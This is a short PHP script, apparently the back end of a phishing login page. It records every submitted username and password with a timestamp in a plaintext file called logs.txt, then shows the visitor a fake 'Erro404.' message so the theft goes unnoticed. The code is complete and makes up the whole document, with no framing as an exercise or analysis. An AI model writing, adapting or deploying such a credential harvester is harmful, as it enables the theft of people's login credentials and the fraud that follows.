<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    $logEntry = date("Y-m-d H:i:s") . " | Username: " . $username . " | Password: " . $password . PHP_EOL;

    $logFile = "logs.txt"; // Log file in the same folder

    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

    echo "Erro404.";
}
?>
